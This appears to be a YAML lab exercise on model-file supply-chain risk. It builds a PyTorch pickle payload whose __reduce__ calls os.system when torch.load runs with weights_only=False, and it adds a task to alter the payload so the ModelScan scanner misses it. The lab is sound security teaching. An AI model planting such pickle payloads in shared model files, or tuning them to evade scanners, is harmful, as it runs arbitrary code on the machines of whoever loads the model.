lab:
  intro: |
    Solve LLMGoat A03. Then build the malicious model from the slides. The payload here only prints a message, but the same method can run any command. **Run it only in a throwaway virtual machine or container.**
  steps:
    - Solve LLMGoat A03, supply chain. Save the prompt.
    - Make a new folder in a throwaway environment. Install PyTorch.
    - Create payload.py with the code below and run it. It writes malicious_model.pth.
    - Create victim.py. It calls torch.load with weights_only=False on the file.
    - Run victim.py. The message "goodbye world!" prints. That proves loading ran code.
    - Run victim.py again with weights_only=True. PyTorch refuses to load the file.
    - "Extend task. Install ModelScan and scan malicious_model.pth. Then try to change the payload so the scan misses it, and note what you learn."
  code: |
    # payload.py
    import torch

    class MaliciousPayload:
        def __reduce__(self):
            import os
            # pickle will call os.system(...) when it rebuilds this object
            return (os.system, ("python3 -c \"print('goodbye world!')\"",))

    torch.save(MaliciousPayload(), "malicious_model.pth")

    # victim.py
    import torch
    torch.load("malicious_model.pth", weights_only=False)   # unsafe on purpose
  hints:
    - On Windows, python3 may be called python. Change the command if nothing prints.
    - If torch.load raises an error about weights_only, you are on PyTorch 2.6 or later and the safe default is on. That is the point of the last step.
  links: [llmgoat, modelscan, torchload, safetensors]

